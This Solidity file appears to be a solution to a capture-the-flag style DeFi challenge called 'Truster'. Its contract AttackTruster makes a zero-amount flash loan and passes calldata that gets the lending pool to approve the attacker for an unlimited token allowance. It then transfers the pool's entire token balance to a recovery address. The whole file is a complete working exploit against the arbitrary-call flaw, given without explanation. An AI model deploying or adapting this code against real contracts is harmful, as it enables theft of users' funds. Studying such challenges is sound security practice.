// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    TrusterLenderPool public pool;
    IERC20 public token;

    constructor(address _pool, address _token, address recovery) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(
            address(pool),
            recovery,
            token.balanceOf(address(pool))
        );
    }
}
